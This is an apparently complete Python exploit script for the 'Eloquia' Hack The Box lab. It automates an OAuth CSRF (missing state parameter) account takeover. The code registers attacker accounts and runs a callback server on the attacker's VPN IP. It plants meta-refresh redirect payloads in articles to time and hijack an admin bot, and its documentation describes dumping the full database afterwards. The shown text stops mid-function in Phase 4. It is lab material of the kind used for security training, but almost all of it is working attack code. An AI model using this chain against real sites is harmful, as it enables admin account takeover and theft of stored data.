#!/usr/bin/env python3
"""
lab_exploit.py - Complete Eloquia OAuth CSRF Exploit
=====================================================

Automates the full attack chain against Eloquia HTB machine.

VULNERABILITY
-------------
OAuth CSRF (Missing State Parameter) - Eloquia uses Qooqle as OAuth provider
but doesn't validate the 'state' parameter. This allows CSRF attacks that
link the admin's account to an attacker-controlled Qooqle identity.

PHASES
------
  Phase 1: SETUP         - Configure /etc/hosts with target hostnames
  Phase 2: REGISTRATION  - Create attacker accounts on Eloquia and Qooqle
  Phase 3: CALIBRATION   - Send test article, measure admin bot timing
  Phase 4: EXPLOIT       - Create poisoned article with OAuth CSRF payload
  Phase 5: TAKEOVER      - Login as admin via OAuth (after bot visits)
  Phase 6: POST-EXPLOIT  - Verify admin access, check available endpoints
  Phase 7: DB EXTRACT    - Download entire database via SQL Explorer

TIMING
------
OAuth codes expire in ~60 seconds, but the admin bot visits every ~3 minutes.
Phase 3 calibrates timing so Phase 4 creates the exploit just before the bot
visits, ensuring the OAuth code is still valid when the bot triggers it.

QUICK START
-----------
  python3 lab_exploit.py              # Run full exploit chain

INDIVIDUAL PHASES (for testing/debugging)
------------------------------------------
  python3 lab_exploit.py --run-phase 1    # Just setup /etc/hosts
  python3 lab_exploit.py --run-phase 2    # Just register accounts
  python3 lab_exploit.py --run-phase 7    # Just extract database (needs cookies)

OPTIONS
-------
  --run-phase N      Run only phase N (1-7). Loads saved state as needed.
  --keep-data        Don't clear tmp/ folder, reuse existing credentials
  --skip-db          Skip Phase 7 (database extraction)
  --bot-interval N   Expected bot visit interval in seconds (default: 180)
  --port N           Capture server port (default: 8888)
  --skip-setup       Skip Phase 1 (hosts configuration)

FILES
-----
  tmp/username.txt       Attacker username
  tmp/password.txt       Attacker password
  tmp/admin_cookies.txt  Admin session cookies (after Phase 5)
  tmp/database/          Extracted database tables (after Phase 7)

Author: Security Research
Target: Eloquia HTB (Windows Insane)
"""

import requests
import subprocess
import threading
import argparse
import random
import string
import shutil
import time
import json
import sys
import os
import re
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
from io import BytesIO
from urllib.parse import parse_qs, urlparse

# =============================================================================
# CONFIGURATION
# =============================================================================

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TMP_DIR = os.path.join(SCRIPT_DIR, "tmp")

# Target configuration (can be overridden via --target)
TARGET_IP = None  # Set via CLI or auto-detected from /etc/hosts
TARGET_ELOQUIA = "http://eloquia.htb"
TARGET_QOOQLE = "http://qooqle.htb"

# OAuth client details (discovered during recon)
CLIENT_ID = "riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi"
REDIRECT_URI = "http://eloquia.htb/accounts/oauth2/qooqle/callback/"

# Timing configuration
BOT_INTERVAL = 181          # Measured bot cycle interval (from bot_timing.py)
EXPLOIT_LEAD_TIME = 20      # Generate OAuth code this many seconds before predicted bot visit
POST_EXPLOIT_WAIT = 20      # Wait this long after exploit article created

# Capture server
CAPTURE_PORT = 8888
CAPTURE_PORT_RETRIES = 10  # Try this many ports if default is busy

# =============================================================================
# ANSI COLORS FOR OUTPUT
# =============================================================================

class C:
    """ANSI color codes for terminal output"""
    R = '\033[91m'   # Red - errors, warnings
    G = '\033[92m'   # Green - success
    Y = '\033[93m'   # Yellow - info, waiting
    B = '\033[94m'   # Blue - section headers
    M = '\033[95m'   # Magenta - highlights
    C = '\033[96m'   # Cyan - data values
    W = '\033[97m'   # White
    BOLD = '\033[1m'
    DIM = '\033[2m'
    X = '\033[0m'    # Reset

# =============================================================================
# UTILITY FUNCTIONS
# =============================================================================

def banner():
    """Display exploit banner"""
    print(f"""
{C.C}{C.BOLD}ELOQUIA OAUTH CSRF EXPLOIT{C.X}
{C.C}{'='*50}{C.X}
  Target: eloquia.htb / qooqle.htb
  Vuln:   OAuth CSRF (Missing State Parameter)
  Impact: Admin Account Takeover
{C.C}{'='*50}{C.X}
""")

def section(title, description=""):
    """Print a section header with optional description"""
    print(f"\n{C.B}{C.BOLD}--- {title} ---{C.X}")
    if description:
        print(f"{C.DIM}    {description}{C.X}")

def step(num, total, msg):
    """Print a step indicator"""
    print(f"{C.Y}[{num}/{total}]{C.X} {msg}")

def success(msg):
    """Print success message"""
    print(f"{C.G}[+]{C.X} {msg}")

def error(msg):
    """Print error message"""
    print(f"{C.R}[-]{C.X} {msg}")

def info(msg):
    """Print info message"""
    print(f"{C.C}[*]{C.X} {msg}")

def warn(msg):
    """Print warning message"""
    print(f"{C.Y}[!]{C.X} {msg}")

def fatal(msg):
    """Print fatal error and exit"""
    print(f"\n{C.R}{C.BOLD}[FATAL]{C.X} {msg}")
    sys.exit(1)

def safe_request(method, url, session=None, **kwargs):
    """
    Make HTTP request with graceful error handling.
    Returns (response, None) on success, (None, error_msg) on failure.
    """
    sess = session or requests.Session()
    kwargs.setdefault('timeout', 30)

    try:
        if method.upper() == 'GET':
            resp = sess.get(url, **kwargs)
        elif method.upper() == 'POST':
            resp = sess.post(url, **kwargs)
        else:
            resp = sess.request(method, url, **kwargs)
        return resp, None
    except requests.exceptions.ConnectionError as e:
        if 'No route to host' in str(e):
            return None, f"Cannot connect to target (No route to host). Is the VPN connected? Is the target IP correct?"
        elif 'Connection refused' in str(e):
            return None, f"Connection refused by {url}. Is the target running?"
        elif 'Name or service not known' in str(e):
            return None, f"Cannot resolve hostname. Check /etc/hosts configuration."
        else:
            return None, f"Connection error: {e}"
    except requests.exceptions.Timeout:
        return None, f"Request timed out to {url}"
    except requests.exceptions.RequestException as e:
        return None, f"Request failed: {e}"

def get_csrf(html):
    """Extract CSRF token from HTML form"""
    match = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', html)
    return match.group(1) if match else None

def get_tun0_ip():
    """Get the tun0 interface IP address"""
    try:
        result = subprocess.run(['ip', 'addr', 'show', 'tun0'],
                              capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'inet ' in line:
                return line.split()[1].split('/')[0]
    except:
        pass
    return None

def ensure_dirs():
    """Create necessary directories"""
    os.makedirs(TMP_DIR, exist_ok=True)
    os.makedirs(os.path.join(TMP_DIR, "cookies"), exist_ok=True)

def clear_tmp(preserve_timing=True):
    """Clear all files in tmp folder for fresh start, optionally preserving timing data"""
    if os.path.exists(TMP_DIR):
        timing_file = os.path.join(TMP_DIR, "bot_timing.json")
        timing_data = None

        # Preserve timing data if requested
        if preserve_timing and os.path.exists(timing_file):
            try:
                with open(timing_file) as f:
                    timing_data = f.read()
            except:
                pass

        shutil.rmtree(TMP_DIR)
        ensure_dirs()

        # Restore timing data
        if timing_data:
            with open(timing_file, "w") as f:
                f.write(timing_data)
    else:
        ensure_dirs()

def save_credentials(username, password):
    """Save credentials to tmp folder"""
    with open(os.path.join(TMP_DIR, "username.txt"), "w") as f:
        f.write(username)
    with open(os.path.join(TMP_DIR, "password.txt"), "w") as f:
        f.write(password)

def load_bot_timing():
    """
    Load timing data from bot_timing.py output.
    Returns dict with interval stats, or None if not available.
    """
    timing_file = os.path.join(TMP_DIR, "bot_timing.json")
    if not os.path.exists(timing_file):
        return None
    try:
        with open(timing_file) as f:
            data = json.load(f)
        intervals = data.get("intervals", [])
        if not intervals:
            return None
        return {
            "interval_avg": sum(intervals) / len(intervals),
            "interval_min": min(intervals),
            "interval_max": max(intervals),
            "samples": len(intervals)
        }
    except:
        return None

def save_bot_timing(intervals):
    """Save timing intervals to bot_timing.json"""
    timing_file = os.path.join(TMP_DIR, "bot_timing.json")
    data = {
        "visits": [],
        "intervals": intervals
    }
    with open(timing_file, "w") as f:
        json.dump(data, f, indent=2)

def load_credentials():
    """Load credentials from tmp folder"""
    try:
        with open(os.path.join(TMP_DIR, "username.txt")) as f:
            username = f.read().strip()
        with open(os.path.join(TMP_DIR, "password.txt")) as f:
            password = f.read().strip()
        return username, password
    except:
        return None, None

def create_banner_image():
    """
    Create a random banner image for article creation.
    Eloquia requires articles to have a banner image >20KB.
    Using 800x600 with random pixels to ensure >20KB.
    """
    try:
        from PIL import Image
        img = Image.new('RGB', (800, 600))
        for i in range(800):
            for j in range(600):
                img.putpixel((i, j), (
                    random.randint(0, 255),
                    random.randint(0, 255),
                    random.randint(0, 255)
                ))
        buf = BytesIO()
        img.save(buf, 'PNG')
        buf.seek(0)
        return buf
    except ImportError:
        error("PIL not installed. Run: pip install Pillow")
        sys.exit(1)

def load_admin_session():
    """
    Load admin session from saved cookies file.
    Used when running individual phases that need admin access.
    Returns requests.Session with admin cookies, or None if not found.
    """
    cookie_file = os.path.join(TMP_DIR, "admin_cookies.txt")
    if not os.path.exists(cookie_file):
        return None

    session = requests.Session()
    try:
        with open(cookie_file) as f:
            for line in f:
                line = line.strip()
                if '=' in line:
                    name, value = line.split('=', 1)
                    session.cookies.set(name, value, domain='eloquia.htb')

        # Verify session is valid
        resp = session.get(f"{TARGET_ELOQUIA}/accounts/profile/")
        if 'admin' in resp.text.lower() or 'Howdy' in resp.text:
            return session
        else:
            return None
    except Exception as e:
        return None

def load_qooqle_session(username, password):
    """
    Create authenticated Qooqle session.
    Used when running individual phases that need Qooqle access.
    """
    session = requests.Session()
    login_page = session.get(f"{TARGET_QOOQLE}/login/")
    csrf = get_csrf(login_page.text)
    if not csrf:
        return None

    session.post(f"{TARGET_QOOQLE}/login/",
        data={
            'csrfmiddlewaretoken': csrf,
            'username': username,
            'password': password
        },
        headers={'Referer': f"{TARGET_QOOQLE}/login/"}
    )

    if 'sessionid' in session.cookies:
        return session
    return None

def print_phase_help():
    """Print detailed help about phases"""
    print(f"""
{C.C}{C.BOLD}PHASE DETAILS{C.X}
{C.C}{'='*60}{C.X}

{C.Y}Phase 1: SETUP{C.X}
  Configures /etc/hosts to resolve eloquia.htb and qooqle.htb
  to the target IP address. Requires sudo.
  {C.DIM}Prerequisites: None
  Creates: /etc/hosts entries{C.X}

{C.Y}Phase 2: REGISTRATION{C.X}
  Creates attacker accounts on both Eloquia and Qooqle platforms
  with matching credentials (required for OAuth linking).
  {C.DIM}Prerequisites: Phase 1 (hosts configured)
  Creates: tmp/username.txt, tmp/password.txt{C.X}

{C.Y}Phase 3: CALIBRATION{C.X}
  Sends a test article with a callback beacon to measure when
  the admin bot visits. This timing is used to optimize Phase 4.
  {C.DIM}Prerequisites: Phase 2 (credentials), VPN connected
  Creates: Timing data for Phase 4{C.X}

{C.Y}Phase 4: EXPLOIT{C.X}
  Creates a poisoned article containing <meta refresh> that
  redirects the admin bot to an OAuth callback with attacker's code.
  {C.DIM}Prerequisites: Phase 3 (timing data)
  Creates: tmp/oauth_code.txt, tmp/exploit_article_id.txt{C.X}

{C.Y}Phase 5: TAKEOVER{C.X}
  Logs in via OAuth after the admin bot has visited the poisoned
  article, obtaining admin session cookies.
  {C.DIM}Prerequisites: Phase 4 (exploit executed, bot visited)
  Creates: tmp/admin_cookies.txt{C.X}

{C.Y}Phase 6: POST-EXPLOIT{C.X}
  Verifies admin access and enumerates available endpoints
  (admin panel, SQL Explorer, etc.)
  {C.DIM}Prerequisites: Phase 5 (admin cookies)
  Creates: Nothing (informational){C.X}

{C.Y}Phase 7: DB EXTRACT{C.X}
  Extracts the entire SQLite database via SQL Explorer.
  Dumps all tables to CSV files and searches for flags/secrets.
  {C.DIM}Prerequisites: Phase 5 (admin cookies)
  Creates: tmp/database/*.csv, tmp/database/_summary.json{C.X}

{C.C}{'='*60}{C.X}
""")

# =============================================================================
# CAPTURE SERVER (for timing calibration)
# =============================================================================

class CaptureServer:
    """
    HTTP server to capture callbacks from admin bot.

    Used during calibration phase to:
    1. Confirm admin bot visits our test article
    2. Measure the timing (how long after article creation)
    3. Calculate when to run the real exploit
    """

    def __init__(self, port=CAPTURE_PORT):
        self.port = port
        self.server = None
        self.thread = None
        self.bot_visit_time = None
        self.bot_visit_event = threading.Event()

    def start(self):
        """Start the capture server in a background thread"""
        handler = self._create_handler()
        self.server = HTTPServer(('0.0.0.0', self.port), handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()

    def stop(self):
        """Stop the capture server"""
        if self.server:
            self.server.shutdown()

    def wait_for_bot(self, timeout=300):
        """Wait for bot callback, return True if received"""
        return self.bot_visit_event.wait(timeout=timeout)

    def _create_handler(self):
        """Create request handler with access to server state"""
        server_instance = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass  # Suppress default logging

            def handle(self):
                """Override to suppress connection reset errors from bot"""
                try:
                    super().handle()
                except (ConnectionResetError, BrokenPipeError):
                    pass  # Bot closed connection abruptly - normal behavior

            def do_GET(self):
                user_agent = self.headers.get('User-Agent', '')
                is_bot = 'HeadlessChrome' in user_agent

                if is_bot and '/oauth_test' in self.path:
                    server_instance.bot_visit_time = time.time()
                    server_instance.bot_visit_event.set()

                    # Parse timing info
                    parsed = urlparse(self.path)
                    params = parse_qs(parsed.query)
                    elapsed = None
                    if 'ts' in params:
                        try:
                            created = int(params['ts'][0])
                            elapsed = int(time.time()) - created
                        except:
                            pass

                    print(f"\n{C.G}{C.BOLD}  >>> ADMIN BOT DETECTED! <<<{C.X}")
                    print(f"  User-Agent: HeadlessChrome")
                    print(f"  Path: {self.path}")
                    if elapsed:
                        print(f"  Elapsed: {elapsed}s since article creation")

                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(b'OK')

        return Handler

# =============================================================================
# TIMING COLLECTION (for --collect-timing)
# =============================================================================

def phase_collect_timing(username, password, callback_ip, num_samples):
    """
    Collect timing samples by creating test articles and measuring bot visit intervals.

    Creates num_samples+1 articles (need N+1 visits to get N intervals).
    Returns list of intervals between bot visits.
    """
    section("TIMING COLLECTION", f"Collecting {num_samples} timing samples")

    intervals = []
    last_visit_time = None

    # Start capture server
    step(1, 3, "Starting capture server...")
    server = None
    actual_port = None

    for port_offset in range(CAPTURE_PORT_RETRIES):
        try_port = CAPTURE_PORT + port_offset
        try:
            server = CaptureServer(try_port)
            server.start()
            actual_port = try_port
            success(f"Listening on 0.0.0.0:{actual_port}")
            break
        except OSError:
            if port_offset < CAPTURE_PORT_RETRIES - 1:
                warn(f"Port {try_port} in use, trying {try_port + 1}...")
            continue

    if not server or not actual_port:
        error(f"Could not start server on ports {CAPTURE_PORT}-{CAPTURE_PORT + CAPTURE_PORT_RETRIES - 1}")
        return None

    # Login to Eloquia
    step(2, 3, "Logging into Eloquia...")
    eloquia = requests.Session()
    login_page, err = safe_request('GET', f"{TARGET_ELOQUIA}/accounts/login/", eloquia)
    if err:
        error(f"Cannot reach Eloquia: {err}")
        server.stop()
        return None

    csrf = get_csrf(login_page.text)
    eloquia.post(f"{TARGET_ELOQUIA}/accounts/login/",
        data={
            'csrfmiddlewaretoken': csrf,
            'username': username,
            'password': password
        },
        headers={'Referer': f"{TARGET_ELOQUIA}/accounts/login/"},
        timeout=30
    )

    if 'sessionid' not in eloquia.cookies:
        error("Eloquia login failed")
        server.stop()
        return None
    success("Logged in")

    # Collect samples
    step(3, 3, f"Collecting {num_samples} interval samples...")
    articles_needed = num_samples + 1  # Need N+1 visits to get N intervals

    for i in range(articles_needed):
        # Create test article
        timestamp = str(int(time.time()))
        test_url = f"http://{callback_ip}:{actual_port}/oauth_test?ts={timestamp}"

        create_page = eloquia.get(f"{TARGET_ELOQUIA}/article/create/", timeout=30)
        csrf = get_csrf(create_page.text)

        content = f'<meta http-equiv="refresh" content="0;url={test_url}"><p>Timing {i+1}</p>'

        my_articles = eloquia.get(f"{TARGET_ELOQUIA}/article/mine/", timeout=30)
        existing_ids = set(re.findall(r'article/visit/(\d+)', my_articles.text))

        resp = eloquia.post(f"{TARGET_ELOQUIA}/article/create/",
            data={
                'csrfmiddlewaretoken': csrf,
                'title': f"Timing {timestamp}",
                'content': content
            },
            files={'banner': ('banner.png', create_banner_image(), 'image/png')},
            headers={'Referer': f"{TARGET_ELOQUIA}/article/create/"},
            timeout=60
        )

        # Find article ID
        article_id = None
        match = re.search(r'article/visit/(\d+)', resp.url + resp.text)
        if match:
            article_id = match.group(1)
        else:
            my_articles = eloquia.get(f"{TARGET_ELOQUIA}/article/mine/", timeout=30)
            new_ids = set(re.findall(r'article/visit/(\d+)', my_articles.text))
            created = new_ids - existing_ids
            if created:
                article_id = max(created)

        if not article_id:
            error(f"Failed to create article {i+1}")
            continue

        # Report article
        eloquia.get(f"{TARGET_ELOQUIA}/article/report/{article_id}/", timeout=30)
        info(f"Article {i+1}/{articles_needed} created (ID {article_id}), waiting for bot...")

        # Wait for bot callback
        server.bot_visit_event.clear()
        start_wait = time.time()

        while not server.bot_visit_event.is_set():
            elapsed = int(time.time() - start_wait)
            remaining = len(intervals)
            print(f"\r    Waiting for bot... {elapsed}s (collected {remaining}/{num_samples} intervals)  ", end='', flush=True)
            if elapsed > 360:  # 6 min timeout
                print()
                warn(f"Timeout waiting for bot on article {i+1}")
                break
            time.sleep(1)

        if server.bot_visit_event.is_set():
            visit_time = server.bot_visit_time
            print(f"\r    Bot visited article {i+1}!                                        ")

            if last_visit_time:
                interval = int(visit_time - last_visit_time)
                intervals.append(interval)
                success(f"Interval {len(intervals)}/{num_samples}: {interval}s")

            last_visit_time = visit_time

        # Small delay before next article
        if i < articles_needed - 1:
            time.sleep(2)

    server.stop()

    if not intervals:
        error("No intervals collected")
        return None

    # Save timing data
    save_bot_timing(intervals)
    avg_interval = sum(intervals) / len(intervals)
    success(f"Collected {len(intervals)} intervals, avg={avg_interval:.0f}s")
    success(f"Saved to tmp/bot_timing.json")

    return intervals

# =============================================================================
# PHASE 1: SETUP
# =============================================================================

def get_hosts_ip():
    """Get current IP for eloquia.htb from /etc/hosts, or None if not configured."""
    try:
        with open('/etc/hosts') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and 'eloquia.htb' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        return parts[0]
    except:
        pass
    return None

def phase_setup(skip=False):
    """
    Configure /etc/hosts with target hostnames.

    Maps:
    - eloquia.htb -> TARGET_IP
    - qooqle.htb  -> TARGET_IP

    This is required because the target uses virtual hosts.
    """
    section("PHASE 1: SETUP", "Configure /etc/hosts with target hostnames")

    if skip:
        info("Skipping setup (--skip-setup)")
        return True

    if not TARGET_IP:
        fatal("No target IP specified. Use --target <IP> or set TARGET_IP in script.")

    step(1, 2, "Checking connectivity...")
    result = subprocess.run(['ping', '-c', '1', '-W', '3', TARGET_IP],
                          capture_output=True)
    if result.returncode == 0:
        success(f"Target {TARGET_IP} is reachable")
    else:
        warn(f"Target {TARGET_IP} not responding to ping (may still work)")

    step(2, 2, "Updating /etc/hosts...")
    hostnames = ['eloquia.htb', 'qooqle.htb']

    # Check current hosts configuration
    current_ip = get_hosts_ip()
    if current_ip == TARGET_IP:
        success(f"Hosts already configured correctly ({TARGET_IP})")
        return True
    elif current_ip:
        warn(f"Hosts file has OLD IP: {current_ip}")
        info(f"Updating to new IP: {TARGET_IP}")

    # Remove old entries and add new one
    try:
        subprocess.run(['sudo', 'sed', '-i', '/eloquia.htb/d', '/etc/hosts'],
                      check=True, capture_output=True)
        subprocess.run(['sudo', 'sed', '-i', '/qooqle.htb/d', '/etc/hosts'],
                      check=True, capture_output=True)
        entry = f"{TARGET_IP}\t{' '.join(hostnames)}\n"
        subprocess.run(['sudo', 'tee', '-a', '/etc/hosts'],
                      input=entry.encode(), capture_output=True, check=True)
        success(f"Hosts file updated: {TARGET_IP} -> {', '.join(hostnames)}")
        return True
    except Exception as e:
        error(f"Failed to update hosts: {e}")
        print(f"  Run manually:")
        print(f"  sudo sed -i '/eloquia.htb/d' /etc/hosts")
        print(f"  echo '{TARGET_IP} {' '.join(hostnames)}' | sudo tee -a /etc/hosts")
        return False

# =============================================================================
# PHASE 2: REGISTRATION
# =============================================================================

def phase_register(new_user=True, skip=False):
    """
    Register attacker account on both Eloquia and Qooqle.

    Creates a user with format: ghost{random6chars}
    Same credentials used on both sites (required for OAuth linking).

    Why both sites?
    - Eloquia: Where we create malicious articles
    - Qooqle: OAuth provider, our identity that will be linked to admin

    Args:
        new_user: If True, always create new user. If False, try existing first.
        skip: If True, only use existing credentials (don't create new)
    """
    section("PHASE 2: REGISTRATION", "Create attacker accounts on both platforms")

    if skip:
        username, password = load_credentials()
        if username:
            info(f"Using existing credentials: {username}")
            return username, password
        else:
            error("No existing credentials found")
            return None, None

    # If new_user=True, skip to creating fresh account
    # If new_user=False, try to reuse existing credentials first
    if not new_user:
        username, password = load_credentials()
        if username:
            info(f"Found existing credentials: {username}")

            # Verify they still work
            step(1, 2, "Verifying Eloquia credentials...")
            session = requests.Session()
            login_page = session.get(f"{TARGET_ELOQUIA}/accounts/login/")
            csrf = get_csrf(login_page.text)
            if csrf:
                session.post(f"{TARGET_ELOQUIA}/accounts/login/",
                    data={
                        'csrfmiddlewaretoken': csrf,
                        'username': username,
                        'password': password
                    },
                    headers={'Referer': f"{TARGET_ELOQUIA}/accounts/login/"}
                )
                if 'sessionid' in session.cookies:
                    success("Eloquia credentials valid")

                    step(2, 2, "Verifying Qooqle credentials...")
                    session2 = requests.Session()
                    login_page = session2.get(f"{TARGET_QOOQLE}/login/")
                    csrf = get_csrf(login_page.text)
                    if csrf:
                        session2.post(f"{TARGET_QOOQLE}/login/",
                            data={
                                'csrfmiddlewaretoken': csrf,
                                'username': username,
                                'password': password
                            },
                            headers={'Referer': f"{TARGET_QOOQLE}/login/"}
                        )
                        if 'sessionid' in session2.cookies:
                            success("Qooqle credentials valid")
                            return username, password

            warn("Existing credentials invalid, creating new account")

    # Generate new credentials
    suffix = ''.join(random.choices(string.ascii_lowercase, k=6))
    username = f"ghost{suffix}"
    password = f"P@ss{suffix}123!"

    info(f"New credentials: {username} / {password}")

    # Register on Eloquia
    step(1, 2, "Registering on Eloquia...")
    session = requests.Session()

    reg_page, err = safe_request('GET', f"{TARGET_ELOQUIA}/accounts/register/", session)
    if err:
        error(f"Cannot reach Eloquia: {err}")
        return None, None

    csrf = get_csrf(reg_page.text)
    if not csrf:
        error("Could not get CSRF token from Eloquia")
        return None, None

    resp, err = safe_request('POST', f"{TARGET_ELOQUIA}/accounts/register/", session,
        data={
            'csrfmiddlewaretoken': csrf,
            'username': username,
            'email': f"{username}@ghost.local",
            'password1': password,
            'password2': password
        },
        headers={'Referer': f"{TARGET_ELOQUIA}/accounts/register/"},
        allow_redirects=False
    )

    if err:
        error(f"Registration request failed: {err}")
        return None, None

    if resp.status_code == 302 or 'already exists' in resp.text.lower():
        success("Eloquia registration complete")
    else:
        error("Eloquia registration failed")
        return None, None

    # Register on Qooqle
    step(2, 2, "Registering on Qooqle...")
    session = requests.Session()

    reg_page, err = safe_request('GET', f"{TARGET_QOOQLE}/register/", session)
    if err:
        error(f"Cannot reach Qooqle: {err}")
        return None, None

    csrf = get_csrf(reg_page.text)
    if not csrf:
        error("Could not get CSRF token from Qooqle")
        return None, None

    resp, err = safe_request('POST', f"{TARGET_QOOQLE}/register/", session,
        data={
            'csrfmiddlewaretoken': csrf,
            'username': username,
            'first_name': username,
            'last_name': 'User',
            'password1': password,
            'password2': password
        },
        headers={'Referer': f"{TARGET_QOOQLE}/register/"},
        allow_redirects=False
    )

    if err:
        error(f"Registration request failed: {err}")
        return None, None

    if resp.status_code == 302 or 'already exists' in resp.text.lower():
        success("Qooqle registration complete")
    else:
        error("Qooqle registration failed")
        return None, None

    # Save credentials
    save_credentials(username, password)
    success(f"Credentials saved to {TMP_DIR}/")

    return username, password

# =============================================================================
# PHASE 3: TIMING CALIBRATION
# =============================================================================

def phase_calibrate(username, password, callback_ip):
    """
    Calibrate exploit timing using a test article.

    The admin bot visits reported articles on a schedule (~3 min intervals).
    OAuth codes expire quickly (~60 seconds).

    This phase:
    1. Creates a test article that redirects to our capture server
    2. Reports it to trigger admin bot
    3. Waits for bot callback
    4. Records the timing for the real exploit

    Returns: (timestamp of bot visit, port used) or (None, None) if failed
    """
    section("PHASE 3: TIMING CALIBRATION",
            "Measure admin bot timing with test article")

    # Start capture server - try multiple ports if needed
    step(1, 5, "Starting capture server...")
    server = None
    actual_port = None

    for port_offset in range(CAPTURE_PORT_RETRIES):
        try_port = CAPTURE_PORT + port_offset
        try:
            server = CaptureServer(try_port)
            server.start()
            actual_port = try_port
            success(f"Listening on 0.0.0.0:{actual_port}")
            break
        except OSError:
            if port_offset < CAPTURE_PORT_RETRIES - 1:
                warn(f"Port {try_port} in use, trying {try_port + 1}...")
            continue

    if not server or not actual_port:
        error(f"Could not start server on ports {CAPTURE_PORT}-{CAPTURE_PORT + CAPTURE_PORT_RETRIES - 1}")
        return None, None

    # Login to Eloquia
    step(2, 5, "Logging into Eloquia...")
    eloquia = requests.Session()
    login_page = eloquia.get(f"{TARGET_ELOQUIA}/accounts/login/")
    csrf = get_csrf(login_page.text)
    eloquia.post(f"{TARGET_ELOQUIA}/accounts/login/",
        data={
            'csrfmiddlewaretoken': csrf,
            'username': username,
            'password': password
        },
        headers={'Referer': f"{TARGET_ELOQUIA}/accounts/login/"}
    )

    if 'sessionid' not in eloquia.cookies:
        error("Eloquia login failed")
        server.stop()
        return None, None
    success("Logged in")

    # Create test article
    step(3, 5, "Creating test article...")
    timestamp = str(int(time.time()))
    test_url = f"http://{callback_ip}:{actual_port}/oauth_test?ts={timestamp}"

    create_page = eloquia.get(f"{TARGET_ELOQUIA}/article/create/")
    csrf = get_csrf(create_page.text)

    content = f'<meta http-equiv="refresh" content="0;url={test_url}"><p>Test</p>'

    # Get existing articles to detect new one
    my_articles = eloquia.get(f"{TARGET_ELOQUIA}/article/mine/")
    existing_ids = set(re.findall(r'article/visit/(\d+)', my_articles.text))

    resp = eloquia.post(f"{TARGET_ELOQUIA}/article/create/",
        data={
            'csrfmiddlewaretoken': csrf,
            'title': f"Test {timestamp}",
            'content': content
        },
        files={'banner': ('banner.png', create_banner_image(), 'image/png')},
        headers={'Referer': f"{TARGET_ELOQUIA}/article/create/"},
        timeout=60
    )

    # Find new article ID
    article_id = None
    match = re.search(r'article/visit/(\d+)', resp.url + resp.text)
    if match:
        article_id = match.group(1)
    else:
        my_articles = eloquia.get(f"{TARGET_ELOQUIA}/article/mine/")
        new_ids = set(re.findall(r'article/visit/(\d+)', my_articles.text))
        created = new_ids - existing_ids
        if created:
            article_id = max(created)

    if not article_id:
        error("Failed to create test article")
        server.stop()
        return None, None

    success(f"Test article created: ID {article_id}")
    info(f"Redirect URL: {test_url}")

    # Report article
    step(4, 5, "Reporting article to trigger admin bot...")
    eloquia.get(f"{TARGET_ELOQUIA}/article/report/{article_id}/")
    success("Article reported")

    # Wait for bot
    step(5, 5, "Waiting for admin bot callback...")
    print(f"    Waiting up to 5 minutes (bot interval ~{BOT_INTERVAL}s)...")

    start_wait = time.time()
    while not server.bot_visit_event.is_set():
        elapsed = int(time.time() - start_wait)
        print(f"\r    Waiting: {elapsed}s  ", end='', flush=True)
        if elapsed > 300:
            print()
            error("Timeout waiting for bot (5 minutes)")
            server.stop()
            return None, None
        time.sleep(1)

    print()
    bot_time = server.bot_visit_time
    elapsed = int(bot_time - float(timestamp))
    success(f"Bot callback received! Elapsed: {elapsed}s")

    server.stop()
    return bot_time, actual_port

# =============================================================================
# PHASE 4: EXPLOIT EXECUTION
# =============================================================================

def phase_exploit(username, password, bot_visit_time):
    """
    Execute the OAuth CSRF attack.

    IMPORTANT: We create a FRESH Qooqle-only account for the attack.
    This account must NOT exist on Eloquia and must have NO prior links.

    Why? If we use the same account on both sites, it may already be linked
    to our own Eloquia account, causing the OAuth login to find our account
    instead of admin's after the attack.

    The attack works by:
    1. Creating a fresh Qooqle-only "attack" account
    2. Generating OAuth code for that attack account
    3. Creating article with <meta refresh> to OAuth callback + attack code
    4. Reporting article so admin bot visits it
    5. Admin bot follows redirect, linking admin's Eloquia to attack Qooqle
    6. We OAuth login with attack Qooqle â†’ get admin access

    Timing is critical:
    - Bot visits every ~181 seconds (predictable cycle)
    - OAuth codes expire in ~60 seconds
    - We predict next bot visit from calibration data
    - Generate OAuth code ~10s before predicted visit (keeps code fresh)
    """
    section("PHASE 4: EXPLOIT EXECUTION",
            "Execute OAuth CSRF attack with fresh code")

    # Calculate precise timing based on bot's predictable cycle
    # Bot visits every BOT_INTERVAL seconds - we predict next visit and execute just before
    now = time.time()
    time_since_bot = now - bot_visit_time

    # Find the next bot visit time
    cycles_elapsed = int(time_since_bot / BOT_INTERVAL)
    next_visit = bot_visit_time + (cycles_elapsed + 1) * BOT_INTERVAL

    # We want to generate OAuth code EXPLOIT_LEAD_TIME seconds before visit
    execute_at = next_visit - EXPLOIT_LEAD_TIME
    wait_time = execute_at - now

    # If we're past the optimal window, wait for next cycle
    if wait_time < 0:
        next_visit += BOT_INTERVAL
        execute_at = next_visit - EXPLOIT_LEAD_TIME
        wait_time = execute_at - now

    info(f"Bot last visited: {int(time_since_bot)}s ago")
    info(f"Next bot visit predicted in: {int(next_visit - now)}s")
    info(f"Will generate OAuth code in: {int(wait_time)}s (to keep code fresh)")

    # Countdown to optimal execution window
    while wait_time > 0:
        mins, secs = divmod(int(wait_time), 60)
        if mins > 0:
            print(f"\r    Waiting: {mins}m {secs}s until optimal window  ", end='', flush=True)
        else:
            print(f"\r    Executing in {secs}s...  ", end='', flush=True)
        time.sleep(1)
        wait_time -= 1
    print()

    print(f"\n    >>> EXECUTING EXPLOIT NOW <<<\n")

    # Step 1: Validate OAuth linking mechanism works
    # We test by linking main account, then "unlink" by changing to throwaway
    step(1, 6, "Validating OAuth linking mechanism...")

    # Login to Eloquia with main account
    eloquia_test = requests.Session()
    login_page = eloquia_test.get(f"{TARGET_ELOQUIA}/accounts/login/")
    csrf = get_csrf(login_page.text)
    eloquia_test.post(f"{TARGET_ELOQUIA}/accounts/login/",
